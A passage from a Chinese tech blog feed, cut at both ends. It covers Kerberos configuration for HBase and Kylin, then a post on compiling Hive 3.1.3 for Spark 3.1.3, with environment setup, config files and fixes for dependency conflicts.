/etc/security/keytab/hbase.service.keytab</span><br></pre></td></tr></table></figure><p>修改HBase配置文件，修改<code>$HBASE_HOME/conf/hbase-site.xml</code>配置文件，增加以下参数</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.security.authentication<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>kerberos<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.master.kerberos.principal<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>hbase/_HOST@EXAMPLE.COM<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.master.keytab.file<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>/etc/security/keytab/hbase.service.keytab<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.regionserver.kerberos.principal<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>hbase/_HOST@EXAMPLE.COM<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.regionserver.keytab.file<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>/etc/security/keytab/hbase.service.keytab<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.coprocessor.region.classes<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>org.apache.hadoop.hbase.security.token.TokenProvider<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分发配置文件</span></span><br><span class="line">xsync <span class="variable">$HBASE_HOME</span>/conf/hbase-site.xml</span><br><span class="line"><span class="comment"># 修改hbase.rootdir路径所有者</span></span><br><span class="line"><span class="comment"># 使用hdfs/hadoop用户进行认证</span></span><br><span class="line">kinit hdfs/hadoop</span><br><span class="line"><span class="comment"># 修改所有者</span></span><br><span class="line">hadoop fs -chown -R hbase:hadoop /hbase</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动HBase</span></span><br><span class="line"><span class="comment"># 修改各节点HBase安装目录所有者,三台机器都修改</span></span><br><span class="line">chown -R hbase:hadoop /opt/module/hbase</span><br><span class="line"><span class="comment"># 配置hbase用户从主节点（hadoop102）到所有节点的ssh免密</span></span><br><span class="line"><span class="comment"># 使用hbase用户启动HBase，hadoop102启动</span></span><br><span class="line">sudo -i -u hbase start-hbase.sh</span><br><span class="line"><span class="comment"># 停止HBase</span></span><br><span class="line"><span class="comment"># 启用Kerberos认证之后，关闭HBase时，需先进行Kerberos用户认证，认证的主体为hbase。</span></span><br><span class="line">sudo -i -u hbase kinit -kt /etc/security/keytab/hbase.service.keytab hbase/hadoop102</span><br><span class="line">sudo -i -u hbase stop-hbase.sh</span><br></pre></td></tr></table></figure><h3 id="3-3-Kylin进行Kerberos认证">3.3 Kylin进行Kerberos认证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用户准备,创建kylin系统用户,102机器</span></span><br><span class="line">useradd -g hadoop kylin</span><br><span class="line"><span class="built_in">echo</span> kylin | passwd --stdin kylin</span><br><span class="line"><span class="comment"># 修改kylin.env.hdfs-working-dir路径所有者为kylin</span></span><br><span class="line"><span class="comment"># 使用hdfs/hadoop用户进行认证</span></span><br><span class="line">kinit hdfs/hadoop</span><br><span class="line">hadoop fs -chown -R hive:hadoop /kylin</span><br><span class="line"><span class="comment"># 修改/opt/module/kylin所有者为kylin</span></span><br><span class="line">chown -R kylin:hadoop /opt/module/kylin</span><br><span class="line"><span class="comment"># 启动kylin</span></span><br><span class="line"><span class="comment"># 在kylin用户下认证为hive主体</span></span><br><span class="line">sudo -i -u kylin kinit -kt /etc/security/keytab/hive.keytab hive</span><br><span class="line"><span class="comment"># 以kylin用户的身份启动kylin</span></span><br><span class="line">sudo -i -u kylin /opt/module/kylin/bin/kylin.sh start</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1&gt;一、Kerberos入门与使用&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;hadoop官网：&lt;a href=&quot;https://hadoop.apache.org/docs/r3.1.3/hadoop-project-dist/hadoop-common/SecureMode.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; title=&quot;https://hadoop.apache.org/docs/r3.1.3/hadoop-project-dist/hadoop-common/SecureMode.html&quot;&gt;https://hadoop.apache.org/docs/r3.1.3/hadoop-project-dist/hadoop-common/SecureMode.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1、Kerberos概述&quot;&gt;1、Kerberos概述&lt;/h2&gt;
&lt;h3 id=&quot;1-1-什么是Kerberos&quot;&gt;1.1 什么是Kerberos&lt;/h3&gt;
&lt;p&gt;Kerberos是一种计算机网络认证协议，用来在非安全网络中，对个人通信以安全的手段进行&lt;strong&gt;身份认证&lt;/strong&gt;。这个词又指麻省理工学院为这个协议开发的一套计算机软件。软件设计上采用客户端/服务器结构，并且能够进行相互认证，即客户端和服务器端均可对对方进行身份认证。可以用于防止窃听、防止重放攻击、保护数据完整性等场合，是一种应用对称密钥体制进行密钥管理的系统&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>Hive-on-spark源码编译与调优</title>
    <link href="https://blog.shawncoding.top/posts/a58251f4.html"/>
    <id>https://blog.shawncoding.top/posts/a58251f4.html</id>
    <published>2024-05-31T08:22:26.000Z</published>
    <updated>2024-05-31T08:32:41.604Z</updated>
    
    <content type="html"><![CDATA[<h1>一、编译环境准备</h1><h2 id="1、hadoop和hive安装">1、hadoop和hive安装</h2><blockquote><p>hive官网版本依赖：<a href="https://hive.apache.org/general/downloads/" target="_blank" rel="noopener" title="https://hive.apache.org/general/downloads/">https://hive.apache.org/general/downloads/</a></p></blockquote><p>这里都是用了hadoop3.1.3和hive3.1.3版本，具体的安装可以参考之前的文章</p><a id="more"></a><h2 id="2、编译环境搭建">2、编译环境搭建</h2><p>使用了ubuntu20作为的编译环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ==================安装jdk===========</span></span><br><span class="line"><span class="comment"># 卸载现有JDK</span></span><br><span class="line"><span class="comment"># centos 操作</span></span><br><span class="line"><span class="comment"># sudo rpm -qa | grep -i java | xargs -n1 sudo rpm -e --nodeps</span></span><br><span class="line"><span class="comment"># 下面是ubuntu</span></span><br><span class="line">sudo apt-get remove openjdk-8-jre-headless</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将JDK上传到虚拟机的/opt/software文件夹下面</span></span><br><span class="line">tar -zxvf jdk-8u212-linux-x64.tar.gz -C /opt/module/</span><br><span class="line"><span class="comment"># 配置JDK环境变量</span></span><br><span class="line">sudo vim /etc/profile.d/my_env.sh</span><br><span class="line"><span class="comment">#JAVA_HOME</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/module/jdk1.8.0_212</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$JAVA_HOME</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 让环境生效</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile.d/my_env.sh</span><br><span class="line"><span class="comment"># 查看是否成功</span></span><br><span class="line">java -version</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================安装maven========</span></span><br><span class="line">wget https://dlcdn.apache.org/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz</span><br><span class="line"><span class="comment"># 解压Maven到/opt/module目录下</span></span><br><span class="line">tar -zxvf apache-maven-3.6.3-bin.tar.gz -C /opt/module/</span><br><span class="line"><span class="comment"># 配置Maven环境变量</span></span><br><span class="line">sudo vim /etc/profile.d/my_env.sh</span><br><span class="line"><span class="comment"># MAVEN_HOME</span></span><br><span class="line"><span class="built_in">export</span> MAVEN_HOME=/opt/module/apache-maven-3.6.3</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$MAVEN_HOME</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 让环境变量生效</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile.d/my_env.sh</span><br><span class="line">mvn -version</span><br><span class="line"><span class="comment"># 配置仓库镜像</span></span><br><span class="line">vim /opt/module/apache-maven-3.6.3/conf/settings.xml</span><br><span class="line"><span class="comment"># 在&lt;mirrors&gt;&lt;/mirrors&gt;节点中增加以下内容 </span></span><br><span class="line">&lt;mirror&gt;</span><br><span class="line">    &lt;id&gt;aliyunmaven&lt;/id&gt;</span><br><span class="line">    &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class="line">    &lt;name&gt;阿里云公共仓库&lt;/name&gt;</span><br><span class="line">    &lt;url&gt;https://maven.aliyun.com/repository/public&lt;/url&gt;</span><br><span class="line">&lt;/mirror&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ====================安装Git====================</span></span><br><span class="line"><span class="comment"># 这是对于centos的</span></span><br><span class="line">sudo yum install https://repo.ius.io/ius-release-el7.rpm https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm</span><br><span class="line">sudo yum install -y git236</span><br><span class="line"><span class="comment"># 对于ubuntu来说，甚至可以自带</span></span><br><span class="line">sudo apt-get install git</span><br><span class="line"></span><br><span class="line"><span class="comment"># =====================安装IDEA=======================</span></span><br><span class="line">wget https://download.jetbrains.com/idea/ideaIU-2021.1.3.tar.gz</span><br><span class="line"><span class="comment"># 解压IDEA到/opt/module目录下</span></span><br><span class="line">tar -zxvf ideaIU-2021.1.3.tar.gz -C /opt/module/</span><br><span class="line"><span class="comment"># 启动IDEA（在图形化界面启动）</span></span><br><span class="line">nohup /opt/module/idea-IU-211.7628.21/bin/idea.sh 1&gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line"><span class="comment"># 配置Maven，配置好maven</span></span><br></pre></td></tr></table></figure><h2 id="3、Hive-on-Spark配置">3、Hive on Spark配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、Spark官网下载jar包地址,在Hive所在节点部署Spark纯净版</span></span><br><span class="line">http://spark.apache.org/downloads.html</span><br><span class="line"><span class="comment"># 上传并解压解压spark-3.1.3-bin-without-hadoop.tgz</span></span><br><span class="line">tar -zxvf spark-3.1.3-bin-without-hadoop.tgz -C /opt/module/</span><br><span class="line">mv /opt/module/spark-3.1.3-bin-hadoop3 /opt/module/spark</span><br><span class="line"><span class="comment"># 修改spark-env.sh配置文件</span></span><br><span class="line">mv /opt/module/spark/conf/spark-env.sh.template /opt/module/spark/conf/spark-env.sh</span><br><span class="line"><span class="comment"># 增加如下内容</span></span><br><span class="line"><span class="built_in">export</span> SPARK_DIST_CLASSPATH=$(hadoop classpath)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、配置SPARK_HOME环境变量</span></span><br><span class="line">sudo vim /etc/profile.d/my_env.sh</span><br><span class="line"><span class="comment"># 添加如下内容</span></span><br><span class="line"><span class="comment"># SPARK_HOME</span></span><br><span class="line"><span class="built_in">export</span> SPARK_HOME=/opt/module/spark</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$SPARK_HOME</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生效</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile.d/my_env.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3、在hive中创建spark配置文件</span></span><br><span class="line">vim /opt/module/hive/conf/spark-defaults.conf</span><br><span class="line">spark.master                               yarn</span><br><span class="line">spark.eventLog.enabled                   <span class="literal">true</span></span><br><span class="line">spark.eventLog.dir                        hdfs://hadoop102:8020/spark-history</span><br><span class="line">spark.executor.memory                    1g</span><br><span class="line">spark.driver.memory             1g</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在HDFS创建如下路径，用于存储历史日志</span></span><br><span class="line">hadoop fs -mkdir /spark-history</span><br></pre></td></tr></table></figure><p><strong>向HDFS上传Spark纯净版jar包</strong></p><ul><li>说明1：由于Spark3.0.0非纯净版默认支持的是hive2.3.7版本，直接使用会和安装的Hive3.1.2出现兼容性问题。所以采用Spark纯净版jar包，不包含hadoop和hive相关依赖，避免冲突。</li><li>说明2：Hive任务最终由Spark来执行，Spark任务资源分配由Yarn来调度，该任务有可能被分配到集群的任何一个节点。所以需要将Spark的依赖上传到HDFS集群路径，这样集群中任何一个节点都能获取到。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传并解压spark-3.0.0-bin-without-hadoop.tgz</span></span><br><span class="line">tar -zxvf /opt/software/spark-3.0.0-bin-without-hadoop.tgz</span><br><span class="line"><span class="comment"># 上传Spark纯净版jar包到HDFS</span></span><br><span class="line">hadoop fs -mkdir /spark-jars</span><br><span class="line">hadoop fs -put spark-3.0.0-bin-without-hadoop/jars/* /spark-jars</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改hive-site.xml文件</span></span><br><span class="line">vim /opt/module/hive/conf/hive-site.xml</span><br><span class="line">&lt;!--Spark依赖位置（注意：端口号8020必须和namenode的端口号一致）--&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;spark.yarn.jars&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;hdfs://hadoop102:8020/spark-jars/*&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;!--Hive执行引擎--&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;hive.execution.engine&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;spark&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure><p>Hive on Spark测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动hive客户端</span></span><br><span class="line">bin/hive</span><br><span class="line"><span class="comment"># 创建一张测试表</span></span><br><span class="line">hive (default)&gt; create table student(id int, name string);</span><br><span class="line"><span class="comment"># 通过insert测试效果</span></span><br><span class="line">hive (default)&gt; insert into table student values(1,<span class="string">'abc'</span>);</span><br></pre></td></tr></table></figure><h1>二、Hive相关问题</h1><h2 id="1、Hadoop和Hive的兼容性问题">1、Hadoop和Hive的兼容性问题</h2><h3 id="1-1-问题描述">1.1 问题描述</h3><p>配置好3.1.3版本之后，启动hive会报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java.lang.NoSuchMethodError: </span><br><span class="line">com.google.common.base.Preconditions.checkArgument(ZLjava/lang/String;Ljava/lang/Object;)V</span><br></pre></td></tr></table></figure><p>上述问题是由Hadoop3.1.3版本所依赖的guava-27.0-jre和Hive-3.1.3版本所依赖的guava-19.0不兼容所致</p><h3 id="1-2-解决思路">1.2 解决思路</h3><ul><li><p>更换Hadoop版本 </p><p>经过观察发现，Hadoop-3.1.0，Hadoop-3.1.1，Hadoop-3.1.2版本的guava依赖均为guava-11.0.2，而到了Hadoop-3.1.3版本，guava依赖的版本突然升级到了guava-27.0-jre。Hive-3的所有发行版本的guava依赖均为guava-19.0。而guava-19.0和guava-11.0.2版本是兼容的，所以理论上降低Hadoop版本，这个问题就能得到有效的解决（将hadoop的guava-27.0-jre复制到hive中也可以暂时使用）</p></li><li><p>升级Hive-3.1.3中的guava依赖版本，并重新编译Hive</p><p>若将Hive-3.1.3中的guava依赖版本升级到guava-27.0-jre，这样就能避免不同版本的guava依赖冲突，上述问题同样能得到解决。</p></li></ul><h3 id="1-3-修改并编译Hive源码">1.3 修改并编译Hive源码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Hive源码的远程仓库地址：</span></span><br><span class="line">https://github.com/apache/hive.git</span><br><span class="line"><span class="comment"># 国内镜像地址：</span></span><br><span class="line">https://gitee.com/apache/hive.git</span><br><span class="line"><span class="comment"># 编译官网：https://cwiki.apache.org/confluence/display/Hive/GettingStarted#GettingStarted-BuildingHivefromSource</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先测试一下能不能成功打包</span></span><br><span class="line">mvn clean package -Pdist -DskipTests -Dmaven.javadoc.skip=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改Maven父工程的pom.xml文件中的guava.version参数</span></span><br><span class="line"><span class="comment"># 将&lt;guava.version&gt;19.0&lt;/guava.version&gt;改为&lt;guava.version&gt;27.0-jre&lt;/guava.version&gt;</span></span><br><span class="line"><span class="comment"># 不停排错，直至编译打包成功</span></span><br></pre></td></tr></table></figure><h2 id="2、Hive插入数据StatsTask失败问题">2、Hive插入数据StatsTask失败问题</h2><h3 id="3-1-问题描述">3.1 问题描述</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动hive客户端</span></span><br><span class="line">bin/hive</span><br><span class="line"><span class="comment"># 创建一张测试表</span></span><br><span class="line">create table student(id int, name string);</span><br><span class="line"><span class="comment"># 执行insert语句</span></span><br><span class="line">insert into table student values(1,<span class="string">'abc'</span>);</span><br><span class="line"><span class="comment"># 测试发现过程发现如下错误信息</span></span><br><span class="line">FAILED: Execution Error, <span class="built_in">return</span> code 1 from org.apache.hadoop.hive.ql.exec.StatsTask</span><br><span class="line"><span class="comment"># 该问题问由Hive自身存在的bug所致，bug详情可参照以下连接：https://issues.apache.org/jira/browse/HIVE-19316</span></span><br></pre></td></tr></table></figure><h3 id="3-2-解决思路">3.2 解决思路</h3><p>该bug已经在3.2.0, 4.0.0, 4.0.0-alpha-1等版本修复了，所以可以参考修复问题的PR，再修改Hive源码并重新编译</p><h2 id="3、Hive和Spark兼容性问题">3、Hive和Spark兼容性问题</h2><h3 id="3-1-问题描述-v2">3.1 问题描述</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置好hive on spark 后，启动hive客户端</span></span><br><span class="line">bin/hive</span><br><span class="line">insert into table student values(1,<span class="string">'abc'</span>);</span><br><span class="line"><span class="comment"># 测试发现过程发现如下错误信息</span></span><br><span class="line">Job failed with java.lang.NoSuchMethodError: </span><br><span class="line">org.apache.spark.api.java.JavaSparkContext.accumulator(Ljava/lang/Object;Ljava/lang/String;Lorg/apache/spark/AccumulatorParam;)Lorg/apache/spark/Accumulator;</span><br></pre></td></tr></table></figure><p>问题是官网下载的Hive3.1.3和Spark3.0.0默认是不兼容的。因为Hive3.1.3支持的Spark版本是2.3.0，所以需要我们重新编译Hive3.1.3版本</p><h3 id="3-2-解决思路-v2">3.2 解决思路</h3><ul><li><p><strong>降低Spark版本</strong></p><p>经过观察发现Hive-3.1.3，版本所兼容的Spark版本为Spark-2.3.0，故降低Spark版本便可有效解决该问题。</p></li><li><p><strong>升级Hive-3.1.3</strong>中的Spark依赖版本至Spark-<strong>3.1.3</strong>，并重新编译Hive</p><p>将Hive源码中的Spark依赖版本升级为Spark-3.1.3，并修改源码，重新编译打包后，同样能解决该问题。</p></li></ul><h3 id="3-3-修改实操">3.3 修改实操</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改Hive项目的pom.xml文件，将spark依赖的版本改为3.1.3</span></span><br><span class="line">&lt;spark.version&gt;2.3.0&lt;/spark.version&gt;</span><br><span class="line">&lt;scala.binary.version&gt;2.11&lt;/scala.binary.version&gt;</span><br><span class="line">&lt;scala.version&gt;2.11.8&lt;/scala.version&gt;</span><br><span class="line"><span class="comment"># 将上面的依赖变为</span></span><br><span class="line">&lt;spark.version&gt;3.1.3&lt;/spark.version&gt;</span><br><span class="line">&lt;scala.binary.version&gt;2.12&lt;/scala.binary.version&gt;</span><br><span class="line">&lt;scala.version&gt;2.12.10&lt;/scala.version&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后将错误信息弄好即可</span></span><br><span class="line">mvn clean package -Pdist -DskipTests -Dmaven.javadoc.skip=<span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="4、Hive编译实战">4、Hive编译实战</h2><blockquote><p>两篇参考文章：<a href="https://blog.csdn.net/c123m/article/details/127128681" target="_blank" rel="noopener" title="Hive 3.1.3 编译">Hive 3.1.3 编译</a>  /  <a href="https://blog.csdn.net/weixin_52918377/article/details/117123969" target="_blank" rel="noopener" title="hive on spark hadoop3.x修改源码依赖">hive on spark hadoop3.x修改源码依赖</a></p></blockquote><p>下面我说一下我编译过程遇到的问题，首先将hive源码克隆下来，git选择<code>checkout Tag or Revision</code>,选择<code>rel/release-3.1.3</code>进行编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开始前需要首先编译测试一下环境</span></span><br><span class="line">mvn clean package -Pdist -DskipTests -Dmaven.javadoc.skip=<span class="literal">true</span></span><br><span class="line"><span class="comment"># 这里有可能会遇到5.1.5-jhyde没有这个jar包错误，将其放入maven仓库即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后0001-guava-27.0-jre.patch/HIVE-19316.patch/spark-3_1_3.patch这三个git补丁包分别对应上面三个问题</span></span><br><span class="line"><span class="comment"># 选择git apply即可导入比较，这个自行研究了</span></span><br><span class="line"><span class="comment"># 同时针对HIVE-19316问题，可以在可视化的git log中搜索HIVE-19316，选择最新的commit,点击cherry-pick和打补丁一样的效果</span></span><br></pre></td></tr></table></figure><p>补丁文件包，依赖包，hive3.1.2-spark3.0.0和hive3.1.3-spark3.1.3二进制包已经全部放进该压缩包</p><p><a href="https://download.csdn.net/download/lemon_TT/87878604" target="_blank" rel="noopener" title="hive3.x编译spark3.x包">hive3.x编译spark3.x包</a></p><h1>三、调优之Yarn和Spark配置</h1><h2 